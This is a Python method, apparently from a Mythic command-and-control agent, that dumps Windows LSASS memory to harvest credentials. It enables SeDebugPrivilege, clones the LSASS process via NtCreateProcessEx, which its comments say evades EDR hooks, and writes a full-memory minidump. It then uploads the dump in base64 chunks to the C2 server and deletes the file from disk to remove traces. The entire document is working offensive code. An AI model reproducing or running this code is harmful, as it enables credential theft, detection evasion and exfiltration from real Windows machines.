    def dump_lsass(self, task_id, output_path=""):
        if platform.system() != 'Windows':
            return "dump_lsass: only supported on Windows"

        try:
            import ctypes
            import ctypes.wintypes as W

            # ── constantes ──────────────────────────────────────────────────
            PROCESS_ALL_ACCESS      = 0x001F0FFF
            TH32CS_SNAPPROCESS      = 0x00000002
            GENERIC_WRITE           = 0x40000000
            FILE_SHARE_NONE         = 0x00000000
            CREATE_ALWAYS           = 2
            FILE_ATTRIBUTE_NORMAL   = 0x00000080
            MiniDumpWithFullMemory  = 0x00000002

            # SeDebugPrivilege
            TOKEN_ADJUST_PRIVILEGES = 0x0020
            TOKEN_QUERY             = 0x0008
            SE_PRIVILEGE_ENABLED    = 0x00000002

            kernel32 = ctypes.windll.kernel32
            ntdll    = ctypes.windll.ntdll
            advapi32 = ctypes.windll.advapi32

            try:
                dbghelp = ctypes.WinDLL('dbghelp.dll', use_last_error=True)
            except OSError as e:
                return "dump_lsass: failed to load dbghelp.dll: {}".format(e)

            INVALID_HANDLE = ctypes.c_size_t(-1).value

            # ── habilita SeDebugPrivilege (best-effort) ──────────────────────
            class LUID(ctypes.Structure):
                _fields_ = [("LowPart", W.DWORD), ("HighPart", W.LONG)]

            class LUID_AND_ATTRIBUTES(ctypes.Structure):
                _fields_ = [("Luid", LUID), ("Attributes", W.DWORD)]

            class TOKEN_PRIVILEGES(ctypes.Structure):
                _fields_ = [("PrivilegeCount", W.DWORD),
                             ("Privileges",     LUID_AND_ATTRIBUTES * 1)]

            try:
                h_token = W.HANDLE()
                if advapi32.OpenProcessToken(
                        kernel32.GetCurrentProcess(),
                        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
                        ctypes.byref(h_token)):
                    luid = LUID()
                    advapi32.LookupPrivilegeValueW(None, "SeDebugPrivilege", ctypes.byref(luid))
                    tp = TOKEN_PRIVILEGES()
                    tp.PrivilegeCount = 1
                    tp.Privileges[0].Luid       = luid
                    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED
                    advapi32.AdjustTokenPrivileges(h_token, False, ctypes.byref(tp),
                                                   ctypes.sizeof(tp), None, None)
                    kernel32.CloseHandle(h_token)
            except Exception:
                pass  # continua sem o privilégio; vai falhar no OpenProcess se não tiver

            # ── localiza PID do lsass.exe ────────────────────────────────────
            class PROCESSENTRY32(ctypes.Structure):
                _fields_ = [
                    ("dwSize",              W.DWORD),
                    ("cntUsage",            W.DWORD),
                    ("th32ProcessID",       W.DWORD),
                    ("th32DefaultHeapID",   ctypes.POINTER(ctypes.c_ulong)),
                    ("th32ModuleID",        W.DWORD),
                    ("cntThreads",          W.DWORD),
                    ("th32ParentProcessID", W.DWORD),
                    ("pcPriClassBase",      ctypes.c_long),
                    ("dwFlags",             W.DWORD),
                    ("szExeFile",           ctypes.c_char * 260),
                ]

            snap = kernel32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
            if snap == INVALID_HANDLE or snap is None:
                return "dump_lsass: CreateToolhelp32Snapshot failed (error {})".format(
                    kernel32.GetLastError())

            entry = PROCESSENTRY32()
            entry.dwSize = ctypes.sizeof(PROCESSENTRY32)
            lsass_pid = None

            if kernel32.Process32First(snap, ctypes.byref(entry)):
                while True:
                    if entry.szExeFile.lower() == b"lsass.exe":
                        lsass_pid = int(entry.th32ProcessID)
                        break
                    if not kernel32.Process32Next(snap, ctypes.byref(entry)):
                        break
            kernel32.CloseHandle(snap)

            if not lsass_pid:
                return "dump_lsass: lsass.exe not found in process list"

            # ── abre LSASS ───────────────────────────────────────────────────
            kernel32.OpenProcess.restype  = W.HANDLE
            kernel32.OpenProcess.argtypes = [W.DWORD, W.BOOL, W.DWORD]
            lsass_handle = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, lsass_pid)

            if not lsass_handle:
                return "dump_lsass: OpenProcess(lsass) failed (error {}) — necessita SeDebugPrivilege".format(
                    kernel32.GetLastError())

            # ── clona LSASS via NtCreateProcessEx ───────────────────────────
            # Técnica: passa o handle do LSASS como ParentProcess.
            # NtCreateProcessEx herda o VAD inteiro → clone em memória.
            # MiniDumpWriteDump no clone (PID 0) em vez do LSASS real
            # → bypassa hooks de EDR que filtram por PID do LSASS.
            ntdll.NtCreateProcessEx.restype  = ctypes.c_ulong   # NTSTATUS
            ntdll.NtCreateProcessEx.argtypes = [
                ctypes.POINTER(W.HANDLE),  # ProcessHandle (out)
                W.DWORD,                   # DesiredAccess
                ctypes.c_void_p,           # ObjectAttributes (NULL)
                W.HANDLE,                  # ParentProcess ← LSASS
                W.BOOL,                    # InheritObjectTable
                ctypes.c_void_p,           # SectionHandle (NULL → usa do pai)
                ctypes.c_void_p,           # DebugPort
                ctypes.c_void_p,           # ExceptionPort
                W.BOOL,                    # InJob
            ]

            forked_handle = W.HANDLE(0)
            ntstatus = ntdll.NtCreateProcessEx(
                ctypes.byref(forked_handle),
                PROCESS_ALL_ACCESS,
                None,
                lsass_handle,
                True,
                None,
                None,
                None,
                False
            )
            kernel32.CloseHandle(lsass_handle)

            if ntstatus != 0 or not forked_handle.value:
                return "dump_lsass: NtCreateProcessEx failed (NTSTATUS 0x{:08X})".format(
                    ntstatus & 0xFFFFFFFF)

            # ── dump do clone ────────────────────────────────────────────────
            if not output_path:
                output_path = os.path.join(
                    os.environ.get("TEMP", os.environ.get("TMP", os.getcwd())),
                    "forked_lsass.dmp"
                )

            kernel32.CreateFileW.restype  = ctypes.c_void_p
            kernel32.CreateFileW.argtypes = [
                W.LPCWSTR, W.DWORD, W.DWORD, ctypes.c_void_p,
                W.DWORD,   W.DWORD, ctypes.c_void_p
            ]
            hfile = kernel32.CreateFileW(
                output_path, GENERIC_WRITE, FILE_SHARE_NONE,
                None, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, None
            )

            if hfile is None or hfile == INVALID_HANDLE:
                kernel32.CloseHandle(forked_handle)
                return "dump_lsass: CreateFile({}) failed (error {})".format(
                    output_path, kernel32.GetLastError())

            dbghelp.MiniDumpWriteDump.restype  = W.BOOL
            dbghelp.MiniDumpWriteDump.argtypes = [
                ctypes.c_void_p,  # hProcess
                W.DWORD,          # ProcessId (0 para clone sem PID real)
                ctypes.c_void_p,  # hFile
                ctypes.c_int,     # DumpType
                ctypes.c_void_p,  # ExceptionParam
                ctypes.c_void_p,  # UserStreamParam
                ctypes.c_void_p,  # CallbackParam
            ]
            success = dbghelp.MiniDumpWriteDump(
                forked_handle.value, 0, hfile,
                MiniDumpWithFullMemory, None, None, None
            )

            kernel32.CloseHandle(ctypes.c_void_p(hfile))
            kernel32.CloseHandle(forked_handle)

            if not success:
                return "dump_lsass: MiniDumpWriteDump failed (error {})".format(
                    ctypes.get_last_error())

            dump_size = os.path.getsize(output_path)
            if dump_size == 0:
                return "dump_lsass: dump criado mas vazio — verifique privilégios"

            # ── upload via protocolo download do Mythic ──────────────────────
            total_chunks = (dump_size + CHUNK_SIZE - 1) // CHUNK_SIZE

            init_resp = self.postMessageAndRetrieveResponse({
                "action": "post_response",
                "responses": [{
                    "task_id": task_id,
                    "download": {
                        "total_chunks": total_chunks,
                        "full_path":    output_path,
                        "chunk_size":   CHUNK_SIZE,
                    }
                }]
            })

            responses_list = init_resp.get("responses", [])
            file_id = responses_list[0].get("file_id") if responses_list else None

            if not file_id:
                return "dump_lsass: dump salvo em {} ({} bytes) mas Mythic nao retornou file_id".format(
                    output_path, dump_size)

            with open(output_path, 'rb') as f:
                for chunk_num in range(1, total_chunks + 1):
                    with self._taskings_lock:
                        stopped = next(
                            (t["stopped"] for t in self.taskings if t["task_id"] == task_id),
                            False
                        )
                    if stopped:
                        return "dump_lsass: job interrompido. Dump parcial em {}".format(output_path)
                    content = f.read(CHUNK_SIZE)
                    if not content:
                        break
                    self.postMessageAndRetrieveResponse({
                        "action": "post_response",
                        "responses": [{
                            "task_id": task_id,
                            "download": {
                                "chunk_num":  chunk_num,
                                "file_id":    file_id,
                                "chunk_data": base64.b64encode(content).decode()
                            }
                        }]
                    })

            # limpa artefato do disco após upload
            try:
                os.remove(output_path)
            except Exception:
                pass

            return json.dumps({
                "file_id":   file_id,
                "dump_path": output_path,
                "size":      dump_size
            })

        except Exception as e:
            return "dump_lsass error: {}".format(e)
